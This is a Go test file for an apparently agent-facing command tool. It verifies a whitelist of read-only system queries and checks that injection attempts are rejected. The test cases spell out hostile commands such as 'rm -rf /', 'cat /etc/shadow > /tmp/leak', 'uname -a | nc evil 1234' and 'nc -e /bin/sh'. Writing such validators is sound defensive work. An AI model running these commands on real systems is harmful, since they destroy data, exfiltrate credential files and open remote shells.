package tools

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
)

func TestSplitCommand_BasicTokens(t *testing.T) {
	cases := []struct {
		in   string
		want []string
	}{
		{"uname -a", []string{"uname", "-a"}},
		{"systemctl status sshd", []string{"systemctl", "status", "sshd"}},
		{"systemctl status 'sshd.service'", []string{"systemctl", "status", "sshd.service"}},
		{`cat "/etc/os-release"`, []string{"cat", "/etc/os-release"}},
		{"  ip   addr   show  ", []string{"ip", "addr", "show"}},
	}
	for _, c := range cases {
		t.Run(c.in, func(t *testing.T) {
			got, err := SplitCommand(c.in)
			if err != nil {
				t.Fatalf("unexpected err: %v", err)
			}
			if !equal(got, c.want) {
				t.Fatalf("argv mismatch: got=%v want=%v", got, c.want)
			}
		})
	}
}

func TestSplitCommand_RejectsMetachars(t *testing.T) {
	bad := []string{
		"uname -a; rm -rf /",
		"uname -a && echo pwned",
		"uname -a || echo pwned",
		"uname -a | tee /tmp/x",
		"echo `id`",
		"echo $(id)",
		"cat /etc/shadow > /tmp/x",
		"cat /etc/shadow >> /tmp/x",
		"uname -a < /etc/passwd",
		"uname -a &",
		"uname\n-a",
	}
	for _, c := range bad {
		if _, err := SplitCommand(c); err == nil {
			t.Errorf("expected error for %q, got nil", c)
		}
	}
}

func TestSplitCommand_RejectsUnterminatedQuote(t *testing.T) {
	if _, err := SplitCommand(`echo "hello`); err == nil {
		t.Fatal("expected error for unterminated quote")
	}
}

func TestIsWhitelisted(t *testing.T) {
	good := [][]string{
		{"uname", "-a"},
		{"systemctl", "status", "sshd"},
		{"ss", "-tlnp"},
		{"ip", "addr", "show"},
		{"ip", "route", "show"},
		{"sysctl", "net.ipv4.ip_forward"},
		{"aa-status"},
		{"ufw", "status"},
		{"dpkg", "-l"},
		{"apt", "list", "--upgradable"},
		{"whoami"},
	}
	for _, argv := range good {
		if !isWhitelisted(argv) {
			t.Errorf("expected whitelisted: %v", argv)
		}
	}

	bad := [][]string{
		{"uname", "-x"},
		{"systemctl", "stop", "sshd"},
		{"systemctl", "restart", "sshd"},
		{"sysctl", "-w", "net.ipv4.ip_forward=1"},
		{"sysctl", "--write", "net.ipv4.ip_forward=1"},
		{"ip", "link", "set", "eth0", "up"},
		{"ip", "addr", "add", "1.2.3.4/24"},
		{"ufw", "allow", "22/tcp"},
		{"dpkg", "-i", "evil.deb"},
		{"apt", "install", "vim"},
		{"bash", "-c", "id"},
		{"sh", "-c", "id"},
		{"nc", "-e", "/bin/sh"},
		{"/bin/sh", "-c", "id"},
	}
	for _, argv := range bad {
		if isWhitelisted(argv) {
			t.Errorf("expected NOT whitelisted: %v", argv)
		}
	}
}

func TestRunCommandRejectsShellMetachar(t *testing.T) {
	tc := &RunCommandTool{}
	for _, cmd := range []string{
		"uname -a; id",
		"uname -a | nc evil 1234",
		"cat /etc/shadow > /tmp/leak",
	} {
		res, err := tc.Execute(context.Background(), json.RawMessage(`{"command":"`+cmd+`"}`))
		if err != nil {
			t.Fatalf("execute returned error for %q: %v", cmd, err)
		}
		if !res.IsError {
			t.Errorf("expected error result for %q, got: %s", cmd, res.Content)
		}
		if !strings.Contains(res.Content, "metacharacter") &&
			!strings.Contains(res.Content, "not on the whitelist") {
			t.Errorf("error message should explain rejection, got: %s", res.Content)
		}
	}
}

func TestRunCommandRejectsShellExec(t *testing.T) {
	tc := &RunCommandTool{}
	res, err := tc.Execute(context.Background(), json.RawMessage(`{"command":"bash -c id"}`))
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	if !res.IsError {
		t.Fatalf("bash -c should be rejected, got: %s", res.Content)
	}
}

func TestRunCommandRejectsSysctlWrite(t *testing.T) {
	tc := &RunCommandTool{}
	res, err := tc.Execute(context.Background(), json.RawMessage(`{"command":"sysctl -w net.ipv4.ip_forward=1"}`))
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	if !res.IsError {
		t.Fatalf("sysctl -w should be rejected, got: %s", res.Content)
	}
}

func TestRunCommandAllowsSysctlRead(t *testing.T) {
	tc := &RunCommandTool{}
	res, err := tc.Execute(context.Background(), json.RawMessage(`{"command":"sysctl net.ipv4.ip_forward"}`))
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	if res.IsError {
		t.Fatalf("sysctl read should be allowed, got error: %s", res.Content)
	}
}

func TestRunCommandCatRequiresAllowedPaths(t *testing.T) {
	tc := &RunCommandTool{}
	res, err := tc.Execute(context.Background(), json.RawMessage(`{"command":"cat /etc/os-release"}`))
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	if !res.IsError {
		t.Fatalf("cat without AllowedReadPaths should be rejected")
	}

	tc2 := &RunCommandTool{AllowedReadPaths: []string{"/etc/"}}
	res, err = tc2.Execute(context.Background(), json.RawMessage(`{"command":"cat /etc/os-release"}`))
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	_ = res

	tc3 := &RunCommandTool{AllowedReadPaths: []string{"/etc/"}}
	res, err = tc3.Execute(context.Background(), json.RawMessage(`{"command":"cat /etc/shadow"}`))
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	if !res.IsError {
		t.Fatalf("cat /etc/shadow should be rejected even with /etc/ prefix")
	}

	tc4 := &RunCommandTool{AllowedReadPaths: []string{"/etc/"}}
	res, err = tc4.Execute(context.Background(), json.RawMessage(`{"command":"cat /etc/*.conf"}`))
	if err != nil {
		t.Fatalf("execute returned error: %v", err)
	}
	if !res.IsError {
		t.Fatalf("cat glob should be rejected")
	}
}

func equal(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
